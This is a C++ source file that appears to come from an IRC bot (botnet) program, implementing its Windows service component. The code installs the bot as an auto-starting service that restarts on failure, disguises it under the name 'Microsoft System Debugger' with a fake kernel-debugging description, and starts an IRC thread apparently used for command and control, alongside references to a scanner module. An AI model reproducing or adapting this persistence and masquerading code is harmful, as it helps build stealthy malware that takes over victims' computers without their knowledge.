#include "vPOEb.h"
#include "vInclude.h"
#include "vExterns.h"

//char szSvcName[] = "Microsoft System Debugger";

HANDLE  hStopEvent;
LPTSTR  lpszServiceName;
SERVICE_STATUS_HANDLE   ssh;

void  WINAPI  Service_Main(DWORD dwArgc, LPTSTR *lpszArgv);
void  WINAPI  Service_Ctrl(DWORD dwCtrlCode);
void  ErrorStopService(LPTSTR lpszAPI);
void  SetTheServiceStatus(DWORD dwCurrentState,DWORD dwWin32ExitCode,
                          DWORD dwCheckPoint,  DWORD dwWaitHint);


void InitSvc() {
	SERVICE_TABLE_ENTRY ste[] =
      {{(char*)vPOEb->vIRC.cConf.vSvcName.c_str(),(LPSERVICE_MAIN_FUNCTION)Service_Main}, {NULL,NULL}};

   if (!StartServiceCtrlDispatcher(ste)) {
      TCHAR error[256];
      wsprintf(error,
         TEXT("Error code for StartServiceCtrlDispatcher: %u.\n"),
         GetLastError());
      OutputDebugString(error);
   }
   else
      OutputDebugString(TEXT("StartServiceCtrlDispatcher OK\n"));
}

// Called by the service control manager after the call to 
// StartServiceCtrlDispatcher.
void WINAPI Service_Main(DWORD dwArgc, LPTSTR *lpszArgv)
{
   DWORD ThreadId;
   DWORD t;
   DWORD dwWaitRes;

   // Obtain the name of the service.
   lpszServiceName = (char*)vPOEb->vIRC.cConf.vSvcName.c_str();

   // Register the service ctrl handler.
   ssh = RegisterServiceCtrlHandler(lpszServiceName,
           (LPHANDLER_FUNCTION)Service_Ctrl);
//   OutputDebugString(TEXT("Registered Service Handle\n"));
   // Create the event to signal the service to stop.
   hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
   if (hStopEvent == NULL)
      ErrorStopService(TEXT("CreateEvent"));
 
   // The service has started.
   SetTheServiceStatus(SERVICE_RUNNING, 0, 0, 0);
 //  OutputDebugString(TEXT("SetTheServiceStatus, SERVICE_RUNNING\n"));

	WSADATA initSock;
	if (WSAStartup(MAKEWORD(2,0), &initSock)) {   
//	   OutputDebugString(TEXT("WSAStartup failed.\n"));
		goto cleanup;
	}
 //  OutputDebugString(TEXT("Started Winsock...\n"));
	vPOEb->botRunning = true;
	InitializeCriticalSectionAndSpinCount(&CriticalSection, 
        0x80000400); 
	vPOEb->vIRC.Init();
	vPOEb->vPOEscan.main.bRunning = false;
	vPOEb->vInstall.SetParameters();
 //  OutputDebugString(TEXT("Set Parameters...\n"));
	vPOEb->vKeepAlive.Start(true);
//   OutputDebugString(TEXT("Started Keepalive...\n"));
	HANDLE hIRC;
	if((hIRC = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunIRC, NULL, 0, 0)) == 0) {
//		OutputDebugString(TEXT("Unable to start thread\n"));
		goto cleanup;	
	}
	while(WaitForSingleObject(hStopEvent, 1000) != WAIT_OBJECT_0)
    {
	//	OutputDebugString("Waiting...");
    }
//	WaitForSingleObject(hIRC, INFINITE);
cleanup:

   // Close the event handle and the thread handle.
   if (!CloseHandle(hStopEvent))
      ErrorStopService(TEXT("CloseHandle"));

   	ReleaseMutex(vPOEb->vInstall.hMutex);
	CloseHandle(hIRC);	
	WSACleanup();
	DeleteCriticalSection(&CriticalSection);

   // Stop the service.
   OutputDebugString(TEXT("SetTheServiceStatus, SERVICE_STOPPED\n"));
   SetTheServiceStatus(SERVICE_STOPPED, NO_ERROR, 0, 0);
}

// Handles control signals from the service control manager.
void WINAPI Service_Ctrl(DWORD dwCtrlCode)
{
   DWORD dwState = SERVICE_RUNNING;

   switch(dwCtrlCode)
   {
      case SERVICE_CONTROL_STOP:
         dwState = SERVICE_STOP_PENDING;
         break;

      case SERVICE_CONTROL_SHUTDOWN:
		 vPOEb->vIRC.Disconnect("System shutting down..");
		 vPOEb->botRunning = false;
         dwState = SERVICE_STOP_PENDING;
         break;

      case SERVICE_CONTROL_INTERROGATE:
         break;

      default:
         break;
   }

   // Set the status of the service.
   SetTheServiceStatus(dwState, NO_ERROR, 0, 0);
   OutputDebugString(
       TEXT("SetTheServiceStatus, Service_Ctrl function\n"));

   // Tell service_main thread to stop.
   if ((dwCtrlCode == SERVICE_CONTROL_STOP) ||
       (dwCtrlCode == SERVICE_CONTROL_SHUTDOWN))
   {
      if (!SetEvent(hStopEvent))
         ErrorStopService(TEXT("SetEvent"));
      else
         OutputDebugString(TEXT("Signal service_main thread\n"));
   }
}

//  Wraps SetServiceStatus.
void SetTheServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode,
                         DWORD dwCheckPoint,   DWORD dwWaitHint)
{
   SERVICE_STATUS ss;  // Current status of the service.

   // Disable control requests until the service is started.
   if (dwCurrentState == SERVICE_START_PENDING)
      ss.dwControlsAccepted = 0;
   else
      ss.dwControlsAccepted =
         SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
         // Other flags include SERVICE_ACCEPT_PAUSE_CONTINUE
         // and SERVICE_ACCEPT_SHUTDOWN.

   // Initialize ss structure.
   ss.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
   ss.dwServiceSpecificExitCode = 0;
   ss.dwCurrentState            = dwCurrentState;
   ss.dwWin32ExitCode           = dwWin32ExitCode;
   ss.dwCheckPoint              = dwCheckPoint;
   ss.dwWaitHint                = dwWaitHint;

   // Send status of the service to the Service Controller.
   if (!SetServiceStatus(ssh, &ss))
      ErrorStopService(TEXT("SetServiceStatus"));
}

//  Handle API errors or other problems by ending the service and
//  displaying an error message to the debugger.

void ErrorStopService(LPTSTR lpszAPI)
{
   INT t;
   TCHAR   buffer[256]  = TEXT("");
   TCHAR   error[1024]  = TEXT("");
   LPVOID lpvMessageBuffer;
   DWORD  dwWaitRes;

   wsprintf(buffer,TEXT("API = %s, "), lpszAPI);
   lstrcat(error, buffer);

   ZeroMemory(buffer, sizeof(buffer));
   wsprintf(buffer,TEXT("error code = %d, "), GetLastError());
   lstrcat(error, buffer);

   // Obtain the error string.
   FormatMessage(
      FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, GetLastError(),
      MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
      (LPTSTR)&lpvMessageBuffer, 0, NULL);

   ZeroMemory((LPVOID)buffer, (DWORD)sizeof(buffer));
   wsprintf(buffer,TEXT("message = %s"), (TCHAR *)lpvMessageBuffer);
   lstrcat(error, buffer);

   // Free the buffer allocated by the system.
   LocalFree(lpvMessageBuffer);

   // Write the error string to the debugger.
   OutputDebugString(error);

   // If you have threads running, tell them to stop. Something went
   // wrong, and you need to stop them so you can inform the SCM.
   SetEvent(hStopEvent);

   // Stop the service.
   SetTheServiceStatus(SERVICE_STOPPED, GetLastError(), 0, 0);
}
// install the service
void InstallSvc(const char *szSvcName,char *szFilePath)
{

	SC_LOCK sclLock; 
	SC_ACTION scBuf;
	LPQUERY_SERVICE_LOCK_STATUS lpqslsBuf; 
	SERVICE_DESCRIPTION sdBuf;	
	DWORD dwBytesNeeded; 
	SERVICE_FAILURE_ACTIONS sfBuf;

  SC_HANDLE hSCM = ::OpenSCManager(NULL,
						SERVICES_ACTIVE_DATABASE,
						SC_MANAGER_ALL_ACCESS);	
  // Check if service is already installed, and uninstall it
  UninstallSvc(szSvcName);
  Sleep(1000);
  // Service installation
  SC_HANDLE hService = ::CreateService(
  hSCM, szSvcName, szSvcName,
  SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
  SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
  szFilePath, NULL, NULL, NULL, NULL, NULL);

   if (hService == NULL)  {
    vPOEb->DebugPrint("debug",con::fg_gray,"[-] Couldn't install %s as service.", szSvcName);
    return; 
   } 
  else {
	vPOEb->DebugPrint("debug",con::fg_gray,"[+] Service %s installed succesfully.", szSvcName); }
 	//need to acquire database lock before reconfiguring. 
	//if the database cannot be locked, report the details. 
	if (!(sclLock = LockServiceDatabase(hSCM))) 
	{
		if (GetLastError() != ERROR_SERVICE_DATABASE_LOCKED) 
			return;

		// Allocate a buffer to get details about the lock.
		lpqslsBuf = (LPQUERY_SERVICE_LOCK_STATUS) LocalAlloc(LPTR,sizeof(QUERY_SERVICE_LOCK_STATUS)+256); 
		if (lpqslsBuf == NULL) 
			return;
 
		// Get and print the lock status information. 
		if (!QueryServiceLockStatus(hSCM, lpqslsBuf, sizeof(QUERY_SERVICE_LOCK_STATUS)+256, &dwBytesNeeded)) 
			return;

		LocalFree(lpqslsBuf); 
	}

	scBuf.Delay=3000;
	scBuf.Type=SC_ACTION_RESTART;

	sfBuf.lpsaActions=&scBuf;
	sfBuf.cActions=1;
	sfBuf.lpCommand=0;
	sfBuf.lpRebootMsg=0;
	sfBuf.dwResetPeriod=10;

	if(!ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfBuf))
		return;

	sdBuf.lpDescription = "Debugs kernel messages in system";

	if(!ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &sdBuf))
		return;

	// Release the database lock. 
	UnlockServiceDatabase(sclLock);
	CloseServiceHandle(hService); 
; 
}

// uninstall the service
void UninstallSvc(const char *szSvcName)
{
	SC_HANDLE hSCM = ::OpenSCManager(NULL,
						SERVICES_ACTIVE_DATABASE,
						SC_MANAGER_ALL_ACCESS);	
    //get a handle to the service
    SC_HANDLE hService = ::OpenService(hSCM, 
                                       szSvcName,
                                       SERVICE_STOP | DELETE);

    if (hService == NULL) {
        vPOEb->DebugPrint("debug",con::fg_gray,"Couldn't open service...");
        return; }
    // let us first stop the service
    SERVICE_STATUS status;
    ::ControlService(hService, SERVICE_CONTROL_STOP, &status);

   // now uninstall the service
    BOOL bDelete = ::DeleteService(hService);
    ::CloseServiceHandle(hService);	

    if (!bDelete)
        vPOEb->DebugPrint("debug",con::fg_gray,"[-] Service could not be deleted.");
	else
		vPOEb->DebugPrint("debug",con::fg_gray,"[+] Service deleted successfully.");
} 

// start the service
void StartSvc(char *szSvcName)
{

  SC_HANDLE hSCM = ::OpenSCManager(NULL,
						SERVICES_ACTIVE_DATABASE,
						SC_MANAGER_ALL_ACCESS);	
    SC_HANDLE hService = ::OpenService(hSCM, 
                                       szSvcName,
                                       SERVICE_START);

    if (hService == NULL)
    {
        vPOEb->DebugPrint("debug",con::fg_gray,"[-] Couldn't access service or service not installed.");
        return;
    }

    //no arguments	
    if(::StartService(hService, 0, NULL)==0)
    {
		vPOEb->DebugPrint("debug",con::fg_gray,"[-] No arguements.");
     }

    ::CloseServiceHandle(hService);
}